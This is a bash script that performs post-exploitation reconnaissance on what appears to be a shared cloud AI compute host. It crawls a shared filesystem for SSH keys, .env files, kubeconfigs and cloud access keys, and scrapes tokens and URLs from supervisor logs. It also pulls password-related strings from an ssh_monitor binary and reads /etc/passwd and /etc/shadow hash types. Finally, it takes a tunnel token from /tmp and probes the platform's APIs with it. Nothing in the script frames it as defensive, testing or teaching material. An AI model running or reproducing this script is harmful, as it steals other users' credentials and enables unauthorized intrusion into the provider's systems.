#!/bin/bash
set +e
echo "###P13START $(date -u)"
echo "=== JFS-TOP ==="; ls -la /root/onethingai-fs/ 2>&1 | head -20; ls /root/onethingai-fs/data1 2>/dev/null | head -20
echo "=== JFS-SENSITIVE ==="
timeout 120 find /root/onethingai-fs -maxdepth 6 \( -name ".env" -o -name "id_rsa" -o -name "*.pem" -o -name "kubeconfig" -o -name "*.key" -o -name "credentials" -o -name ".netrc" -o -name "config.json" \) -size -1M 2>/dev/null | head -40
echo "=== JFS-PRIVATEKEY-GREP ==="
timeout 150 grep -rIl "BEGIN OPENSSH PRIVATE KEY\|BEGIN RSA PRIVATE KEY\|LTAI\|AKIA\|sk-" /root/onethingai-fs 2>/dev/null | head -20
echo "=== JFS-USERS ==="; ls -la /root/onethingai-fs/data1 2>/dev/null | head -30
echo "=== LOGS ==="; ls -la /var/log/supervisor 2>&1 | head -15; ls /var/log 2>/dev/null | head -20
for f in /var/log/supervisor/*.log; do echo "--- $f"; tail -c 1500 "$f" 2>/dev/null | grep -aoE "https?://[a-zA-Z0-9./:_-]+|token[=:] ?[a-zA-Z0-9._-]{8,}|AKID|LTAI[A-Za-z0-9]{8,}" | sort -u | head -8; done
echo "=== LOG-URLS ==="; grep -rhaoE "https?://[a-zA-Z0-9./:_-]+" /var/log/supervisor /var/log/*.log 2>/dev/null | sort -u | head -30
echo "=== SSH_MONITOR ==="; file /usr/bin/ssh_monitor 2>/dev/null; ls -l /usr/bin/ssh_monitor 2>/dev/null; strings -n 8 /usr/bin/ssh_monitor 2>/dev/null | grep -aE "password|passwd|secret|token|http|127.0.0.1|exec|/bin/sh" | head -25
echo "=== PASSWD ==="; awk -F: '{print $1":"$3":"$7}' /etc/passwd | head -30
echo "=== SHADOW-TYPES ==="; awk -F: '{split($2,a,"$"); print $1":hashlen="length($2)":alg="a[2]}' /etc/shadow 2>/dev/null | head -20
echo "=== PLATFORM-API ==="
TOK=$(grep -oE "ONE_TUNNEL='[^']+'" /tmp/ul_ot.txt 2>/dev/null | cut -d"'" -f2)
for u in https://proxy-ai.onethingai.com/ https://api.onethingai.com/ https://www.onethingai.com/ https://proxy-ai.onethingai.com/api/v1/instances https://proxy-ai.onethingai.com/v1/models; do
  printf "%s " "$u"; curl -s -m 10 -o /tmp/p.$$ -w "c=%{http_code} l=%{size_download} " "$u" 2>/dev/null; head -c 120 /tmp/p.$$ | tr '\n' ' '; echo
  printf "  with-token "; curl -s -m 10 -H "Authorization: Bearer $TOK" -o /tmp/p2.$$ -w "c=%{http_code} l=%{size_download} " "$u" 2>/dev/null; head -c 100 /tmp/p2.$$ | tr '\n' ' '; echo
done
echo "=== AGENT-LOGS ==="; find /var/log /tmp /root -maxdepth 3 -name "*.log" -newermt "2026-11-20" 2>/dev/null | head -20
echo "###P13END $(date -u)"
